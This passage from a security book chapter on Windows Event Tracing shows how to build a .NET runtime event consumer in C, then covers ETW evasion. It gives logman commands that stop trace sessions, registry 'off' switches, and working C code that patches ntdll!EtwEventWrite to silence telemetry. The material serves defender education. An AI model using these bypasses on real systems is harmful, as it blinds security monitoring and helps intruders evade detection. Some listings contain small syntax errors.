<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-19: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_PROPERTY_INFO</samp> struct</span></p>&#13;
<p class="TX">We must parse each structure in the array individually. First, it gets the length of the property with which it is working. This length is dependent on the way in which the event is defined (for example, MOF versus manifest). Generally, we derive the size of the property either from the <samp class="SANS_TheSansMonoCd_W5Regular_11">length</samp> member <span class="CodeAnnotation" aria-label="annotation3">❸</span>, from the size of a known data type (such as the size of an unsigned long, or <samp class="SANS_TheSansMonoCd_W5Regular_11">ulong</samp>), or by calling <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhGetPropertySize()</samp>. If the property itself is an array, we need to retrieve its size by either evaluating the <samp class="SANS_TheSansMonoCd_W5Regular_11">count</samp> member <span class="CodeAnnotation" aria-label="annotation2">❷</span> or calling <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhGetPropertySize()</samp> again.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_162" aria-label=" Page 162. "/>Next, we need to determine whether the data being evaluated is itself a structure. Since the caller typically knows the format of the data with which they’re working, this isn’t difficult in most cases and generally only becomes relevant when parsing events from unfamiliar providers. If an agent does need to work with structures inside events, however, the <samp class="SANS_TheSansMonoCd_W5Regular_11">Flags</samp> member <span class="CodeAnnotation" aria-label="annotation1">❶</span> will include the <samp class="SANS_TheSansMonoCd_W5Regular_11">PropertyStruct</samp> (0x1) flag.</p>&#13;
<p class="TX">When the data isn’t a structure, as in the case of the Microsoft-Windows-DotNETRuntime provider, it will be a simple value mapping, and we can get this map information using <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhGetEventMapInformation()</samp>. This function takes a pointer to the <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACE_EVENT_INFO</samp>, as well as a pointer to the map name offset, which it can access via the <samp class="SANS_TheSansMonoCd_W5Regular_11">MapNameOffset</samp> member. On completion, it receives a pointer to an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_MAP_INFO</samp> structure, defined in <a href="#list8-20">Listing 8-20</a>, which defines the metadata about the event map.</p>&#13;
<pre id="list8-20"><code>typedef struct _EVENT_MAP_INFO {&#13;
  ULONG           NameOffset;&#13;
  MAP_FLAGS       Flag;&#13;
  ULONG           EntryCount;&#13;
  union {&#13;
    MAP_VALUETYPE MapEntryValueType;&#13;
    ULONG         FormatStringOffset;&#13;
  };&#13;
  EVENT_MAP_ENTRY MapEntryArray[ANYSIZE_ARRAY];&#13;
} EVENT_MAP_INFO;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-20: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_MAP_INFO</samp> structure definition</span></p>&#13;
<p class="TX"><a href="#list8-21">Listing 8-21</a> shows how our callback function uses this structure.</p>&#13;
<pre id="list8-21"><code>void CALLBACK OnEvent(PEVENT_RECORD pRecord)&#13;
{&#13;
  <var>--snip--</var>&#13;
&#13;
    WCHAR pszValue[512];&#13;
    USHORT wPropertyLen = 0;&#13;
    ULONG ulPointerSize =&#13;
      (pRecord-&gt;EventHeader.Flags &amp; EVENT_HEADER_FLAG_32_BIT_HEADER) ? 4 : 8;&#13;
&#13;
    USHORT wUserDataLen = pRecord-&gt;UserDataLength;&#13;
&#13;
 <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> for (USHORT i = 0; i &lt; pEventInfo-&gt;TopLevelPropertyCount; i++)&#13;
    {&#13;
        EVENT_PROPERTY_INFO propertyInfo =&#13;
          pEventInfo-&gt;EventPropertyInfoArray[i];&#13;
        PCWSTR pszPropertyName =&#13;
          PCWSTR)((BYTE*)pEventInfo + propertyInfo.NameOffset);&#13;
&#13;
      wPropertyLen = propertyInfo.length;&#13;
&#13;
    <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> if ((propertyInfo.Flags &amp; PropertyStruct | PropertyParamCount)) != 0)&#13;
      {&#13;
          return;&#13;
      }&#13;
      PEVENT_MAP_INFO pMapInfo = NULL;<span role="doc-pagebreak" epub:type="pagebreak" id="pg_163" aria-label=" Page 163. "/>&#13;
      PWSTR mapName = NULL;&#13;
&#13;
    <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> if (propertyInfo.nonStructType.MapNameOffset)&#13;
      {&#13;
          ULONG ulMapSize = 0;&#13;
          mapName = (PWSTR)((BYTE*)pEventInfo +&#13;
            propertyInfo.nonStructType.MapNameOffset);&#13;
&#13;
          dwStatus = TdhGetEventMapInformation(&#13;
                       pRecord,&#13;
                       mapName,&#13;
                       pMapInfo,&#13;
                       &amp;ulMapSize);&#13;
&#13;
          if (dwStatus == ERROR_INSUFFICIENT_BUFFER)&#13;
          {&#13;
            pMapInfo = (PEVENT_MAP_INFO)malloc(ulMapSize);&#13;
&#13;
          <span class="CodeAnnotationCode-1" aria-label="annotation4">❹</span> dwStatus = TdhGetEventMapInformation(&#13;
                         pRecord,&#13;
                         mapName,&#13;
                         pMapInfo,&#13;
                         &amp;ulMapSize);&#13;
        if (dwStatus != ERROR_SUCCESS)&#13;
        {&#13;
            pMapInfo = NULL;&#13;
        }&#13;
      }&#13;
    }&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-21: Parsing the event map information</span></p>&#13;
<p class="TX">To parse the events that the provider emits, we iterate over every top-level property in the event by using the total count of properties found in <samp class="SANS_TheSansMonoCd_W5Regular_11">TopLevelPropertyCount</samp> for the trace event information structure <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Then, if we’re not dealing with a structure <span class="CodeAnnotation" aria-label="annotation2">❷</span> and the offset to the name of the member is present <span class="CodeAnnotation" aria-label="annotation3">❸</span>, we pass the offset to <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhGetEventMapInformation()</samp><span class="CodeAnnotation" aria-label="annotation4">❹</span> to get the event map information.</p>&#13;
<p class="TX">At this point, we’ve collected all the pieces of information required to fully parse the event data. Next, we call <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhFormatProperty()</samp>, passing in the information we collected previously. <a href="#list8-22">Listing 8-22</a> shows this function in action.</p>&#13;
<pre id="list8-22"><code>void CALLBACK OnEvent(PEVENT_RECORD pRecord)&#13;
{&#13;
    <var>--snip--</var>&#13;
&#13;
    ULONG ulBufferSize = sizeof(pszValue);&#13;
    USHORT wSizeConsumed = 0;&#13;
&#13;
    dwStatus = TdhFormatProperty(&#13;
                pEventInfo,&#13;
                pMapInfo,<span role="doc-pagebreak" epub:type="pagebreak" id="pg_164" aria-label=" Page 164. "/>&#13;
                ulPointerSize,&#13;
                propertyInfo.nonStructType.InType,&#13;
                propertyInfo.nonStructType.OutType,&#13;
                wPropertyLen,&#13;
                wUserDataLen,&#13;
                pUserData,&#13;
                &amp;ulBufferSize,&#13;
              <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> pszValue,&#13;
                &amp;wSizeConsumed);&#13;
&#13;
    if (dwStatus == ERROR_SUCCESS)&#13;
    {&#13;
      <var>--snip--</var>&#13;
&#13;
      wprintf(L"%s: %s\n", <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> pszPropertyName, pszValue);&#13;
&#13;
      <var>--snip--</var>&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-22: Retrieving event data with <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">tdh!TdhFormatProperty()</samp></span></p>&#13;
<p class="TX">After the function completes, the name of the property (as in the <i>key</i> portion of the key-value pair) will be stored in the <samp class="SANS_TheSansMonoCd_W5Regular_11">NameOffset</samp> member of the event map information structure (which we’ve stored in the <samp class="SANS_TheSansMonoCd_W5Regular_11">pszPropertyName</samp> variable <span class="CodeAnnotation" aria-label="annotation2">❷</span>, for brevity). Its value will be stored in the buffer passed into <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhFormatProperty()</samp> as the <samp class="SANS_TheSansMonoCd_W5Regular_11">Buffer</samp> parameter <span class="CodeAnnotation" aria-label="annotation1">❶</span> (<samp class="SANS_TheSansMonoCd_W5Regular_11">pszValue</samp>, in our example).</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h3 class="H2" id="sec14"><span id="h-118"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Testing the Consumer</samp></h3>&#13;
<p class="TNI">The snippet shown in <a href="#list8-23">Listing 8-23</a> comes from our .NET event consumer. It shows the assembly-load event for the Seatbelt reconnaissance tool being loaded into memory via a command-and-control agent.</p>&#13;
<pre id="list8-23"><code>AssemblyID: 0x266B1031DC0&#13;
AppDomainID: 0x26696BBA650&#13;
BindingID: 0x0&#13;
AssemblyFlags: 0&#13;
FullyQualifiedAssemblyName: Seatbelt, Version=1.0.0.0, <var>--snip--</var>&#13;
ClrInstanceID: 10</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-23: Consumer of the Microsoft-Windows-DotNETRuntime provider detecting Seatbelt being loaded</span></p>&#13;
<p class="TX">From here, the agent can use the values as it pleases. If, for instance, the agent wanted to terminate any process that loads the Seatbelt assembly, it could use this event to trigger that preventive action. To instead act more passively, it could take the information collected from this event, supplement it with additional information about the originating process, and create its own event to feed into detection logic.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
<h2 class="H1" id="sec15"><span id="h-119"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_165" aria-label=" Page 165. "/><samp class="SANS_Futura_Std_Bold_B_11">Evading ETW-Based Detections</samp></h2>&#13;
<p class="TNI">As we’ve demonstrated, ETW can be an incredibly useful method for collecting information from system components that would otherwise be impossible to get. The technology isn’t without its limitations, however. Because ETW was built for monitoring or debugging and not as a critical security component, its protections aren’t as robust as those of other sensor components.</p>&#13;
<p class="TX">In 2021, Claudiu Teodorescu, Igor Korkin, and Andrey Golchikov of Binarly gave a great presentation at Black Hat Europe in which they cataloged existing ETW evasion techniques and introduced new ones. Their talk identified 36 unique tactics for bypassing ETW providers and trace sessions. The presenters split these techniques into five groups: attacks from inside an attacker-controlled process; attacks on ETW environment variables, the registry, and files; attacks on user-mode ETW providers; attacks on kernel-mode ETW providers; and attacks on ETW sessions.</p>&#13;
<p class="TX">Many of these techniques overlap in other ways. Moreover, while some work across most providers, others target specific providers or trace sessions. Several of the techniques are also covered in Palantir’s blog post “Tampering with Windows Event Tracing: Background, Offense, and Defense.” To summarize both groups’ findings, this section breaks down the evasions into broader categories and discusses the pros and cons of each.</p>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h3 class="H2" id="sec16"><span id="h-120"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Patching</samp></h3>&#13;
<p class="TNI">Arguably the most common technique for evading ETW in the offensive world is patching critical functions, structures, and other locations in memory that play some role in the emission of events. These patches aim to either completely prevent the provider from emitting events or selectively filter the events that it sends.</p>&#13;
<p class="TX">You’ll most commonly see this patching take the form of function hooking, but attackers can tamper with numerous other components to alter event flow. For example, an attacker could null out the <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACEHANDLE</samp> used by the provider or modify its <samp class="SANS_TheSansMonoCd_W5Regular_11">TraceLevel</samp> to prevent certain types of events from being emitted. In the kernel, an attacker could also modify structures such as the <samp class="SANS_TheSansMonoCd_W5Regular_11">ETW_REG_ENTRY</samp>, the kernel’s representation of an event registration object. We’ll discuss this technique in greater detail in <span class="Xref">“Bypassing a .NET Consumer” on <a href="#sec20">page 166</a></span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h3 class="H2" id="sec17"><span id="h-121"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Configuration Modification</samp></h3>&#13;
<p class="TNI">Another common technique involves modifying persistent attributes of the system, including registry keys, files, and environment variables. A vast number of procedures fall into this category, but all generally aim to prevent a trace session or provider from functioning as expected, typically by abusing something like a registry-based “off” switch.</p>&#13;
<p class="TX">Two examples of “off” switches are the <samp class="SANS_TheSansMonoCd_W5Regular_11">COMPlus_ETWEnabled</samp> environment variable and the <samp class="SANS_TheSansMonoCd_W5Regular_11">ETWEnabled</samp> value under the <i>HKCU:\Software\Microsoft\.NETFramework</i> registry key. By setting either of these values to <samp class="SANS_TheSansMonoCd_W5Regular_11">0</samp>, an adversary <span role="doc-pagebreak" epub:type="pagebreak" id="pg_166" aria-label=" Page 166. "/>can instruct <i>clr.dll</i>, the image for the Microsoft-Windows-DotNETRuntime provider, not to register any <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACEHANDLE</samp>, preventing the provider from emitting ETW events.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
<h3 class="H2" id="sec18"><span id="h-122"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Trace-Session Tampering</samp></h3>&#13;
<p class="TNI">The next technique involves interfering with trace sessions already running on the system. While this typically requires system-level privileges, an attacker who has elevated their access can interact with a trace session of which they are not the explicit owner. For example, an adversary may remove a provider from a trace session using <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!EnableTraceEx2()</samp> or, more simply, using logman with the following syntax:</p>&#13;
<pre><code>logman.exe update trace <var>TRACE_NAME</var> --p <var>PROVIDER_NAME</var> --ets</code></pre>&#13;
<p class="TX">Even more directly, the attacker may opt to stop the trace entirely:</p>&#13;
<pre><code>logman.exe stop "<var>TRACE_NAME</var>" -ets</code></pre>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
<h3 class="H2" id="sec19"><span id="h-123"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Trace-Session Interference</samp></h3>&#13;
<p class="TNI">The final technique complements the previous one: it focuses on preventing trace sessions, most commonly autologgers, from functioning as expected before they are started, resulting in persistent changes to the system.</p>&#13;
<p class="TX">One example of this technique is the manual removal of a provider from an autologger session through a modification of the registry. By deleting the subkey tied to the provider, <i>HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\&lt;AUTOLOGGER_NAME&gt;\&lt;PROVIDER_GUID&gt;</i>, or by setting its <samp class="SANS_TheSansMonoCd_W5Regular_11">Enabled</samp> value to <samp class="SANS_TheSansMonoCd_W5Regular_11">0</samp>, the attacker can remove the provider from the trace session after the next reboot.</p>&#13;
<p class="TX">Attackers could also take advantage of ETW’s mechanisms to prevent sessions from working as expected. For example, only one trace session per host can enable a legacy provider (as in MOF- or TMF-based WPP). If a new session enabled this provider, the original session would no longer receive the desired events. Similarly, an adversary could create a trace session with the same name as the target before the security product has a chance to start its session. When the agent attempts to start its session, it will be met with an <samp class="SANS_TheSansMonoCd_W5Regular_11">ERROR_ALREADY_EXISTS</samp> error code.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
<h2 class="H1" id="sec20"><span id="h-124"/><samp class="SANS_Futura_Std_Bold_B_11">Bypassing a .NET Consumer</samp></h2>&#13;
<p class="TNI">Let’s practice evading ETW-based telemetry sources by targeting a .NET runtime consumer similar to the one we wrote earlier in this chapter. In his blog post “Hiding Your .NET—ETW,” Adam Chester describes how to prevent the common language runtime from emitting ETW events, keeping a sensor from identifying the loading of SharpHound, a C# tool that collects the data to be fed into the path-mapping attacker tool BloodHound.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_167" aria-label=" Page 167. "/>The bypass works by patching the function responsible for emitting the ETW event, <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventWrite()</samp>, and instructing it to return immediately upon entry. Chester discovered that this function was ultimately responsible for emitting the event by setting a breakpoint on this function in WinDbg and watching for calls from <i>clr.dll</i>. The syntax for setting this conditional breakpoint is as follows:</p>&#13;
<pre><code>bp ntdll!EtwEventWrite "r $t0 = 0;&#13;
  .foreach (p {k}) {.if ($spat(\"p\", \"clr!*\")) {r $t0 = 1; .break}};&#13;
  .if($t0 = 0) {gc}"</code></pre>&#13;
<p class="TX">The conditional logic in this command tells WinDbg to parse the call stack (<samp class="SANS_TheSansMonoCd_W5Regular_11">k</samp>) and inspect each line of the output. If any lines begin with <samp class="SANS_TheSansMonoCd_W5Regular_11">clr!</samp>, indicating that the call to <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventWrite()</samp> originated from the common language runtime, a break is triggered. If there are no instances of this substring in the call stack, the application simply continues.</p>&#13;
<p class="TX">If we view the call stack when the substring is detected, shown in <a href="#list8-24">Listing 8-24</a>, we can observe the common language runtime emitting events.</p>&#13;
<pre id="list8-24"><code>  0:000&gt; <b>k</b>&#13;
  # RetAddr                Call Site&#13;
<span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> 00 ntdll!EtwEventWrite&#13;
  01 clr!CoTemplate_xxxqzh+0xd5&#13;
  02 clr!ETW::LoaderLog::SendAssemblyEvent+0x1cd&#13;
<span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> 03 clr!ETW::LoaderLog::ModuleLoad+0x155&#13;
  04 clr!DomainAssembly::DeliverSyncEvents+0x29&#13;
  05 clr!DomainFile::DoIncrementalLoad+0xd9&#13;
  06 clr!AppDomain::TryIncrementalLoad+0x135&#13;
  07 clr!AppDomain::LoadDomainFile+0x149&#13;
  08 clr!AppDomain::LoadDomainAssemblyInternal+0x23e&#13;
  09 clr!AppDomain::LoadDomainAssembly+0xd9&#13;
  0a clr!AssemblyNative::GetPostPolicyAssembly+0x4dd&#13;
  0b clr!AssemblyNative::LoadFromBuffer+0x702&#13;
  0c clr!AssemblyNative::LoadImage+0x1ef&#13;
<span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> 0d mscorlib_ni!System.AppDomain.Load(Byte[])$ 60007DB+0x3b&#13;
  0e mscorlib_ni!DomainNeutralILStubClass.IL_STUB_CLRtoCOM(Byte[])&#13;
  0f clr!COMToCLRDispatchHelper+0x39&#13;
  10 clr!COMToCLRWorker+0x1b4&#13;
  11 clr!GenericComCallStub+0x57&#13;
  12 0x00000209`24af19a6&#13;
  13 0x00000209`243a0020&#13;
  14 0x00000209`24a7f390&#13;
  15 0x000000c2`29fcf950</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-24: An abbreviated call stack showing the emission of ETW events in the common language runtime</span></p>&#13;
<p class="TX">Reading from bottom to top, we can see that the event originates in <samp class="SANS_TheSansMonoCd_W5Regular_11">System.AppDomain.Load()</samp>, the function responsible for loading an assembly into the current application domain <span class="CodeAnnotation" aria-label="annotation3">❸</span>. A chain of internal calls leads into the <samp class="SANS_TheSansMonoCd_W5Regular_11">ETW::Loaderlog</samp> class <span class="CodeAnnotation" aria-label="annotation2">❷</span>, which ultimately calls <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventWrite()</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_168" aria-label=" Page 168. "/>While Microsoft doesn’t intend for developers to call this function directly, the practice is documented. The function is expected to return a Win32 error code. Therefore, if we can manually set the value in the EAX register (which serves as the return value on Windows) to <samp class="SANS_TheSansMonoCd_W5Regular_11">0</samp> for <samp class="SANS_TheSansMonoCd_W5Regular_11">ERROR_SUCCESS</samp>, the function should immediately return, appearing to always complete successfully without emitting an event.</p>&#13;
<p class="TX">Patching this function is a relatively straightforward four-step process. Let’s dive into it in <a href="#list8-25">Listing 8-25</a>.</p>&#13;
<pre id="list8-25"><code>#define WIN32_LEAN_AND_MEAN&#13;
#include &lt;Windows.h&gt;&#13;
&#13;
void PatchedAssemblyLoader()&#13;
{&#13;
    PVOID pfnEtwEventWrite = NULL;&#13;
    DWORD dwOldProtection = 0;&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> pfnEtwEventWrite = GetProcAddress(&#13;
      LoadLibraryW(L"ntdll"),&#13;
      "EtwEventWrite"&#13;
    );&#13;
&#13;
    if (!pfnEtwEventWrite)&#13;
    {&#13;
        return;&#13;
    }&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation2">❷</span> VirtualProtect(&#13;
      pfnEtwEventWrite,&#13;
      3,&#13;
      PAGE_READWRITE,&#13;
      &amp;dwOldProtection&#13;
      );&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation3">❸</span> memcpy(&#13;
      pfnEtwEventWrite,&#13;
      "\x33\xc0\xc3", // xor eax, eax; ret&#13;
      3&#13;
      );&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation4">❹</span> VirtualProtect(&#13;
      pfnEtwEventWrite,&#13;
      3,&#13;
      dwOldProtection,&#13;
      NULL&#13;
      );&#13;
&#13;
      <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-25: Patching the <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">ntdll!EtwEventWrite()</samp> function</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_169" aria-label=" Page 169. "/>We locate the entry point to <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventWrite()</samp> in the currently loaded copy of <i>ntdll.dll</i> using <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!GetProcAddress()</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. After locating the function, we change the memory protections of the first three bytes (the size of our patch) from read-execute (<samp class="SANS_TheSansMonoCd_W5Regular_11">rx</samp>) to read-write (<samp class="SANS_TheSansMonoCd_W5Regular_11">rw</samp>) <span class="CodeAnnotation" aria-label="annotation2">❷</span> to allow us to overwrite the entry point. Now all we have to do is copy in the patch using something like <samp class="SANS_TheSansMonoCd_W5Regular_11">memcpy()</samp> <span class="CodeAnnotation" aria-label="annotation3">❸</span> and then revert the memory protections to their original state <span class="CodeAnnotation" aria-label="annotation4">❹</span>. At this point, we can execute our assembly loader functionality without worrying about generating common language runtime loader events.</p>&#13;
<p class="TX">We can use WinDbg to validate that <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventWrite()</samp> will no longer emit events, as shown in <a href="#list8-26">Listing 8-26</a>.</p>&#13;
<pre id="list8-26"><code>0:000&gt; <b>u ntdll!EtwEventWrite</b>&#13;
ntdll!EtwEventWrite:&#13;
00007ff8`7e8bf1a0 33c0         xor     eax,eax&#13;
00007ff8`7e8bf1a2 c3           ret&#13;
00007ff8`7e8bf1a3 4883ec58     sub     rsp,58h&#13;
00007ff8`7e8bf1a7 4d894be8     mov     qword ptr [r11-18h],r9&#13;
00007ff8`7e8bf1ab 33c0         xor     eax,eax&#13;
00007ff8`7e8bf1ad 458943e0     mov     dword ptr [r11-20h],r8d&#13;
00007ff8`7e8bf1b1 4533c9       xor     r9d,r9d&#13;
00007ff8`7e8bf1b4 498943d8     mov      qword ptr [r11-28h],rax</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-26: The patched <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">ntdll!EtwEventWrite()</samp> function</span></p>&#13;
<p class="TX">When this function is called, it will immediately clear the EAX register by setting it to 0 and return. This prevents the logic for producing ETW events from ever being reached and effectively stops the provider’s telemetry from flowing to the EDR agent.</p>&#13;
<p class="TX">Even so, this bypass has limitations. Because <i>clr.dll</i> and <i>ntdll.dll</i> are mapped into their own processes, they have the ability to tamper with the provider in a very direct manner. In most cases, however, the provider is running as a separate process outside the attacker’s immediate control. Patching the event-emission function in the mapped <i>ntdll.dll</i> won’t prevent the emission of events in another process.</p>&#13;
<p class="TX">In his blog post “Universally Evading Sysmon and ETW,” Dylan Halls describes a different technique for preventing ETW events from being emitted that involves patching <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtTraceEvent()</samp>, the syscall that ultimately leads to the ETW event, in kernel mode. This means that any ETW event on the system routed through this syscall won’t be emitted while the patch is in place. This technique relies on the use of Kernel Driver Utility (KDU) to subvert Driver Signature Enforcement and InfinityHook to mitigate the risk of PatchGuard crashing the system if the patch were detected. While this technique expands the ability to evade ETW-based detections, it requires a driver to be loaded and protected kernel-mode code to be modified, making it subject to any mitigations to the techniques leveraged by KDU or InfinityHook.</p>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec21">&#13;
<h2 class="H1" id="sec21"><span id="h-125"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_170" aria-label=" Page 170. "/><samp class="SANS_Futura_Std_Bold_B_11">Conclusion</samp></h2>&#13;
<p class="TNI">ETW is one of the most important technologies for collecting host-based telemetry on Windows. It provides an EDR with visibility into components and processes, such as the Task Scheduler and local DNS client, that no other sensor can monitor. An agent can consume events from nearly any providers it finds and use that information to gain an immense amount of context about system activities. Evasion of ETW is well researched, with most strategies focusing on disabling, unregistering, or otherwise rendering a provider or consumer unable to handle events.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>